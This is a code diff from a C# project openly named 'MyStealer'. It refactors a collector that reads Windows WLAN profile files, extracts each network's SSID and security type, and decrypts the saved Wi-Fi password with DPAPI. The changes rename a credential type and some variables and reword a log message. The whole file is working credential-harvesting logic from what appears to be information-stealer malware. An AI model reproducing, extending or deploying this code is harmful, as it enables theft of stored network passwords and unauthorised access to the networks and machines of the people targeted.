@@ -18,16 +18,16 @@ namespace MyStealer.Collectors.System
 
         public ILogger logger = LogExt.ForModule(ApplicationName);
 
-        public IImmutableSet<CredentialEntry> GetCredentials()
+        public IImmutableSet<WirelessProfile> GetCredentials()
         {
             var path = Path.Combine(Environment.GetEnvironmentVariable("ProgramData"), "Microsoft", "WlanSvc");
             if (!Directory.Exists(path))
             {
                 logger.Warning("Path {path} is not found.", path);
-                return ImmutableHashSet<CredentialEntry>.Empty;
+                return ImmutableHashSet<WirelessProfile>.Empty;
             }
 
-            var builder = ImmutableHashSet.CreateBuilder<CredentialEntry>();
+            var builder = ImmutableHashSet.CreateBuilder<WirelessProfile>();
 
             foreach (var guidFolder in Directory.EnumerateDirectories(Path.Combine(path, "Interfaces")))
             {
@@ -43,7 +43,7 @@ namespace MyStealer.Collectors.System
                         var security = doc.Element("MSM").Element("security");
 
                         var authEncryption = security.Element("authEncryption");
-                        var protocol = authEncryption.Element("authentication").Value + '-' + authEncryption.Element("encryption").Value;
+                        var secProtocol = authEncryption.Element("authentication").Value + '-' + authEncryption.Element("encryption").Value;
 
                         var sharedKey = security.Element("sharedKey");
                         var isProtected = bool.Parse(sharedKey.Element("protected").Value);
@@ -51,24 +51,21 @@ namespace MyStealer.Collectors.System
 
                         if (isProtected)
                         {
-                            var buffer = HexString.FromHexString(key);
+                            var buffer = HexString.HexToBytes(key);
                             var decrypted = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                             key = Encoding.UTF8.GetString(decrypted);
                         }
 
-                        builder.Add(new CredentialEntry
+                        builder.Add(new WirelessProfile
                         {
-                            ApplicationName = ApplicationName,
-                            ApplicationProfileName = "",
-                            Protocol = protocol,
-                            Host = "",
-                            UserName = ssid,
+                            Security = secProtocol,
+                            SSID = ssid,
                             Password = key
                         });
                     }
                     catch (Exception ex)
                     {
-                        logger.Warning(ex, "Error parsing file {path}.", profileFile);
+                        logger.Warning(ex, "Error parsing wlan profile {path}.", profileFile);
                     }
                 }
             }
